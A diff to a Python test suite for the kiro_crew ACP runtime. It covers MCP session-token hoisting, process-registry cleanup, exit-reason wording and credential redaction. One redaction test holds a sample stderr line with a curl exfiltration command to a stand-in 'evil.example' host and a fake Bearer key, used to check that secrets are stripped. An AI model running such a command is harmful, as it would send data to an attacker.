@@ -24,7 +24,9 @@ lines; the subprocess and stdin are mocked (no kiro-cli is launched).
 import asyncio
 import gc
 import json
+import logging
 import os
+import signal
 import time
 import weakref
 from pathlib import Path
@@ -245,11 +247,31 @@ def kas_readiness_wire(monkeypatch, tmp_path):
                 assert name in wire_names
                 element = next(e for e in request["params"]["mcpServers"] if e["name"] == name)
                 assert element["type"] == "stdio"
-                assert element["command"] == projected["mcpServers"][name]["command"]
-                assert element["env"] == [
+                # The resume path owns its array, so its session token rides on
+                # the hoisted element; create_session is handed an explicit array
+                # here, which mints none.
+                tokens = [pair for pair in element["env"] if pair["name"] == STUB_SESSION_TOKEN_ENV]
+                assert len(tokens) == (1 if resume else 0) and all(p["value"] for p in tokens)
+                declared_env = [
                     {"name": k, "value": str(v)}
                     for k, v in (projected["mcpServers"][name].get("env") or {}).items()
                 ]
+                if not tokens:
+                    assert element["command"] == projected["mcpServers"][name]["command"]
+                    assert element["env"] == declared_env
+                    continue
+                # A tokened element launches the managed invocation, never the
+                # spec's (KAS spawns it; gatewayd's own-binary check never runs).
+                from kiro_crew.agent import _managed_mcp_env, managed_mcp_spec_entry
+
+                managed = managed_mcp_spec_entry(name, include_opt_in=True)
+                assert element["command"] == managed["command"]
+                assert element["args"] == [str(a) for a in managed.get("args", [])]
+                assert [p for p in element["env"] if p not in tokens] == [
+                    p
+                    for p in declared_env
+                    if p["name"] in ("KIROCREW_PORT", "KIROCREW_SESSION_KEY")
+                ] + [{"name": k, "value": v} for k, v in _managed_mcp_env().items()]
         if pre_ready:
             status("connected")
             tags("kirocrew-core", "kirocrew-dashboard")
@@ -2067,6 +2089,118 @@ async def test_mark_dead_is_idempotent():
     assert q["sA"].empty()
 
 
+# ── An exit the reader OBSERVES retires the registry entries too ─────────────
+#
+# ``_kill_inner`` untracks the root after its own reap. A root killed from outside
+# reached no kill, so its ``kiro_session_pids.txt`` / ``kiro_pids.txt`` lines
+# survived until the periodic sweep's next tick, up to 300s. Measured on the
+# nightly leak gate: SIGKILL of a background runtime left its line for 293s. The
+# reader loop's EOF branch now retires the two entries once the exit is CONFIRMED,
+# and only then -- a closed stdout on a process that is still running, or one
+# whose exit cannot be confirmed within the reap window, keeps its lines.
+
+
+def _track_untracks(monkeypatch, rt_mod, *, pid_exists: bool):
+    """Record every identity-bound retirement; the real one is pinned in
+    test_pid_lifecycle.py against the files themselves."""
+    calls: list[tuple[int, str | None]] = []
+    monkeypatch.setattr(
+        rt_mod, "_untrack_root_by_identity", lambda p, tok: calls.append((p, tok)) or True
+    )
+    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda p: pid_exists)
+    return calls
+
+
+@pytest.mark.asyncio
+async def test_observed_exit_retires_registry_entries_once_reaped(monkeypatch):
+    """EOF on a root that the child watcher then reaps: both entries are dropped."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, reader, proc = _make_runtime()
+    rt._spawn_start_token = "tok-4242"
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+
+    async def _reap():  # the reap lands after EOF, as in the field
+        proc.returncode = -9
+        return -9
+
+    proc.wait = _reap
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert rt._dead is True
+    # Bound to the identity read at spawn, never to the bare number.
+    assert calls == [(4242, "tok-4242")]
+    # The status the wait measured reaches the retained summary: a turn or a
+    # cron that records this death sees the real code, not ``<not reaped>``.
+    assert rt._death_label == "-9"
+    assert rt._death_summary is not None and "returncode=-9" in rt._death_summary
+
+
+@pytest.mark.asyncio
+async def test_observed_exit_keeps_tracking_while_the_root_still_runs(monkeypatch):
+    """A closed stdout is not an exit. A root that never exits within the reap
+    window, or one whose pid still answers after the wait, stays tracked -- an
+    untracked live process is invisible to every reaper for the host's uptime."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    # Wait times out: the process closed its pipe and kept running.
+    rt, reader, proc = _make_runtime()
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+    rt._KILL_REAP_TIMEOUT = 0.05
+
+    async def _never_exits():
+        await asyncio.sleep(10)
+
+    proc.wait = _never_exits
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert calls == []
+
+    # Reaped by the watcher's account, yet the pid still answers: retain.
+    rt, reader, proc = _make_runtime()
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=True)
+    proc.returncode = 1
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert calls == []
+
+
+@pytest.mark.asyncio
+async def test_eof_inside_an_oversize_line_retires_the_same_way(monkeypatch):
+    """The other observed-EOF return: stdout closes mid-oversize-line. Same
+    confirmed exit, same retirement -- a sibling left to the sweep would carry
+    the very 300s window the empty-line branch closes."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, reader, proc = _make_runtime()
+    rt._spawn_start_token = "tok-4242"
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+    proc.returncode = 137
+    task = await _start_reader(rt)
+    try:
+        # Over the reader's line limit with no newline, then EOF: readuntil raises
+        # LimitOverrunError, the drain hits IncompleteReadError.
+        reader.feed_data(b"x" * (reader._limit + 1))
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert rt._dead is True
+    assert calls == [(4242, "tok-4242")]
+
+
 # ── Death-log severity: deliberate teardown vs genuine death ──
 #
 # A warm-pool TTL recycle tears runtimes down via kill() on a schedule; logging
@@ -2574,7 +2708,15 @@ async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(ca
 
 
 @pytest.mark.asyncio
-async def test_exit_reason_appends_last_nonempty_stderr_line():
+async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
+    """A child's last word is not why it died.
+
+    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
+    the child happened to flush last -- so the reason stays the exit status and
+    the line is kept at debug. Pasting such a line as the cause is what puts
+    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
+    SIGTERM teardown.
+    """
     rt, reader, proc = _make_runtime()
     proc.returncode = 1
     rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
@@ -2588,9 +2730,27 @@ async def test_exit_reason_appends_last_nonempty_stderr_line():
     finally:
         await _stop_reader(task)
     msg = str(ei.value)
-    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert msg == "process exited (rc=1)"
+    assert "sandbox dir" not in msg
     assert "warming up" not in msg
     assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_names_the_signal_that_ended_the_child():
+    """A negative returncode is POSIX's ``-signum``, and the number alone is the
+    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
+    something ASKED the process to stop, which is what the fleet's deaths were."""
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
+    # SIGKILL is POSIX only; see the same reasoning in
+    # test_runtime_death_is_a_process_event.py::test_signal_death_names_its_signal.
+    # Windows cannot name signal 9 and its negative returncodes are not signums,
+    # so the number alone is correct there rather than a name it never delivered.
+    if hasattr(signal, "SIGKILL"):
+        assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
+    else:
+        assert rt._exit_reason(-9) == "process exited (rc=-9)"
+    assert rt._exit_reason(1) == "process exited (rc=1)"
 
 
 def test_exit_reason_without_stderr_is_unchanged():
@@ -2611,42 +2771,71 @@ def test_exit_reason_enospc_points_at_doctor():
     assert "kirocrew doctor" in rt._exit_reason(1)
 
 
-def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
+    """Which line a child flushed last is a race with its own buffering, so the
+    signature is searched over the whole retained tail."""
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = [
+        "mkdir: cannot create directory: No space left on device",
+        "shutting down",
+    ]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
+    """Redaction is unconditional and lands BEFORE the cut, so a long line
+    cannot leave a secret's first half in the shown prefix. Asserted on a line
+    that DOES earn the cause slot, since that is the text the card carries."""
     import kiro_crew.acp.runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
     payload = "A" * 80
     rt._stderr_lines = [
-        f"auth failed: curl https://evil.example/collect?data={payload} "
+        f"No space left on device: curl https://evil.example/collect?data={payload} "
         "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
     ]
     msg = rt._exit_reason(1)
     assert "AKIAIOSFODNN7EXAMPLE" not in msg
     assert payload not in msg
-    assert "auth failed" in msg
-    # The cut lands AFTER redaction, so a long line cannot leave a secret's
-    # first half in the shown prefix.
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "No space left on device" in msg
+    rt._stderr_lines = [
+        "No space left on device "
+        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
+        + " AKIAIOSFODNN7EXAMPLE"
+    ]
     assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
 
 
-def test_exit_reason_tail_is_bounded_to_one_line():
+def test_exit_reason_redacts_the_demoted_tail_too(caplog):
+    """The debug log is a real sink, so the line demoted to it is redacted on
+    the same pass -- a secret must not survive by being merely unpromoted."""
+    rt, _reader, _proc = _make_runtime()
+    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
+        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
+        rt._exit_reason(1)
+    assert "exit stderr tail" in caplog.text
+    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text
+
+
+def test_exit_reason_cause_is_bounded_to_one_line():
     from kiro_crew.acp import runtime as rt_mod
 
     assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
     rt, _reader, _proc = _make_runtime()
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    lead = "No space left on device "
+    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
     msg = rt._exit_reason(1)
-    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
-    assert msg.endswith("…")
+    assert "…" in msg
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
     # Exactly at the cap nothing is cut.
-    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
-    assert not rt._exit_reason(1).endswith("…")
+    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
+    assert "…" not in rt._exit_reason(1)
 
 
 def test_exit_reason_enospc_hint_survives_the_tail_cap():
-    """The signature is matched on the whole line: a marker past the cap
-    still points at the doctor even though the card shows only the head."""
+    """The signature is matched on the whole line and the HINT is appended after
+    the cut, so a line long enough to be trimmed cannot push the operator's
+    pointer out of the message that pointer is the whole purpose of."""
     from kiro_crew.acp import runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
@@ -5773,6 +5962,71 @@ class TestAcpRuntimePidTracking:
         assert calls["session"] == [4242]
 
     @pytest.mark.asyncio
+    async def test_kill_retires_by_identity_when_a_spawn_token_is_held(self, monkeypatch):
+        """The reap proved THIS process dead, not that its number is still ours:
+        a root spawned since can already hold it. So the kill path retires the
+        line that names this process (the token read at spawn), never the lines
+        that merely carry the number."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        identity_calls: list[tuple[int, str]] = []
+
+        def _by_identity(pid, token):
+            identity_calls.append((pid, token))
+            return True
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", _by_identity)
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert identity_calls == [(4242, "tok-a")]
+
+    @pytest.mark.asyncio
+    async def test_kill_clears_the_bare_line_only_while_dead_when_no_session_line_was_ours(
+        self, monkeypatch
+    ):
+        """Identity retirement found no line of ours (spawn's append failed, or a
+        successor already replaced it). The bare line still goes -- but through
+        the probe-under-lock helper, never by number alone."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        if_dead_calls: list[int] = []
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", lambda pid, token: False)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", lambda pid: if_dead_calls.append(pid))
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert if_dead_calls == [4242]
+
+    @pytest.mark.asyncio
     async def test_kill_keeps_pid_tracked_when_the_process_survives(self, monkeypatch):
         """A survivor must STAY tracked so the orphan sweeps can still reach it.
 
@@ -6267,7 +6521,7 @@ class TestAcpRuntimeLoadSession:
 
             return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])
 
-        def _hoist(agents, agent, servers):
+        def _hoist(agents, agent, servers, **_kw):
             # The shape the real hoist produces: a managed server appears on the
             # array that was not in the roster the caller passed in.
             return agents, list(servers) + [{"name": "hoisted", "command": "/bin/h"}]
@@ -6295,6 +6549,77 @@ class TestAcpRuntimeLoadSession:
             "the report reads a different array than the resume sent; rebind "
             "wire_servers at the hoist rather than only load_params['mcpServers']"
         )
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
+    async def test_kas_hoisted_control_plane_carries_the_session_token(self, monkeypatch, resume):
+        """On KAS the managed servers reach the wire through the hoist, token included.
+
+        The runtime stamps the per-session token onto its array BEFORE
+        ``hoist_managed_servers`` runs, and on KAS that array is empty: every
+        managed server arrives through the hoist. A hoisted ``kirocrew-core``
+        without the token reads its tool policy unattested and refuses every call
+        as ``identity_unattested`` -- memory, logs, spawn_run -- on every session.
+        """
+        rt, _, _ = _make_runtime()
+        rt._can_load_session = True
+        sent: list[tuple[str, dict]] = []
+
+        async def _fake_send(method, params, timeout=None):
+            sent.append((method, params))
+            if method == METHOD_SESSION_LOAD:
+                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
+            if method == METHOD_SESSION_NEW:
+                return {"sessionId": "sid-kas-new"}
+            return {}
+
+        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
+            from kiro_crew.acp.harness import SessionExtras
+
+            return SessionExtras(
+                custom_agents=[
+                    {
+                        "id": agent,
+                        "prompt": "p",
+                        "tools": ["@kirocrew-core", "@external"],
+                        "mcpServers": {
+                            "kirocrew-core": {
+                                "command": "kc",
+                                "args": ["mcp-core"],
+                                "env": {"KIROCREW_SESSION_KEY": session_key},
+                            },
+                            "external": {"command": "ext"},
+                        },
+                    }
+                ]
+            )
+
+        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
+        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
+        # Readiness is its own concern (see the kas_readiness_wire tests); this one
+        # is about what the request carried, so the wait returns at once.
+        monkeypatch.setattr(AcpSessionHandle, "wait_mcp_ready", AsyncMock(return_value=None))
+        rt._acp_backend = ACP_BACKEND_KAS
+
+        if resume:
+            handle = await rt.load_session(
+                "", "sid-kas-load", cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
+            )
+            method = METHOD_SESSION_LOAD
+        else:
+            handle = await rt.create_session(
+                cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
+            )
+            method = METHOD_SESSION_NEW
+        params = next(p for m, p in sent if m == method)
+        core = [e for e in params["mcpServers"] if e.get("name") == "kirocrew-core"]
+        assert len(core) == 1, "kirocrew-core must travel in the session-level array"
+        (token,) = _identity_tokens(core)
+        assert token, "the hoisted kirocrew-core was launched without the session token"
+        assert token == handle.stub_session_token, "the element must carry THIS session's token"
+        # A third-party server stays in the agent block, and never gets the token.
+        (agent_block,) = params["_meta"]["kiro"]["customAgents"]
+        assert STUB_SESSION_TOKEN_ENV not in json.dumps(agent_block)
 
     @pytest.mark.asyncio
     async def test_load_session_keeps_the_transcript_path_alongside_the_agents(self, monkeypatch):
